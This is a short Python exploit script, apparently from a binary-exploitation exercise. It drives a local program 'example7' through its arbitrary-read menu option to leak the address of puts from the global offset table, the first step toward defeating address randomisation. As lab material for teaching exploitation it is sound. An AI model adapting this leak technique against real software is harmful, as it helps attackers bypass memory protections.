#!/usr/bin/python
'''
example7_leak.py
'''
import struct
import subprocess
import os
import pty
def readline(fd):
  res = ''
  try:
    while True:
      ch = os.read(fd, 1)
      res += ch
      if ch == '\n':
        return res
  except:
    raise
def read(fd, n):
  return os.read(fd, n)
def readuntil(fd, needle):
  res = ''
  while True:
    res += os.read(fd, 1)
    if needle in res:
      return res
def writeline(proc, data):
  try:
    proc.stdin.write(data + '\n')
    proc.stdin.flush()
  except:
    raise
def write(proc, data):
  try:
    proc.stdin.write(data)
    proc.stdin.flush()
  except:
    raise
def p32(val):
  return struct.pack("<I", val)
def u32(data):
  return struct.unpack("<I", data)[0]
out_r, out_w = pty.openpty()
s = subprocess.Popen("./example7", stdin=subprocess.PIPE, stdout=out_w)

def arb_read(addr):
  readuntil(out_r, "2. Arbitrary Write")
  writeline(s, "1")
  readuntil(out_r, ": ")
  writeline(s, "%d"%addr)
  return int(readuntil(out_r, "\n"), 16)

puts_addr = arb_read(0x8049ff8)
print "puts @ "+hex(puts_addr)